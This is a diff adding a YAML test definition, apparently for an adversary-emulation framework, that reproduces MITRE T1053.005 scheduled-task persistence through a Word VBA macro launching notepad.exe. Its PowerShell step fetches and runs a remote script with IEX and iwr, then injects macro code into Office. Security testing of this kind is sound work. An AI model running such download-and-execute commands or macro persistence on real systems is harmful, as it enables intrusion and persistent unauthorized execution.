@@ -1,0 +1,30 @@
+api_version: "2.0"
+name: Task Scheduler via VBA
+description: |
+    This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute "notepad.exe" within
+    30 - 40 seconds after this module has run
+args:
+    - name: ms_product
+      type: string
+      default: Word
+uuid: ecd3fa21-7792-41a2-8726-2c5c673414d3
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1053: Scheduled Task/Job'
+    subtechniques:
+        - 'T1053.005: Scheduled Task'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: task-scheduler-via-vba
+      inline: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"{{.Args.ms_product}}\" -sub \"Scheduler\"\n"
+      executor: powershell
+      cleanup:
+        inline: |
+            Unregister-ScheduledTask -TaskName "Run Notepad" -Confirm:$false
+        executor: powershell
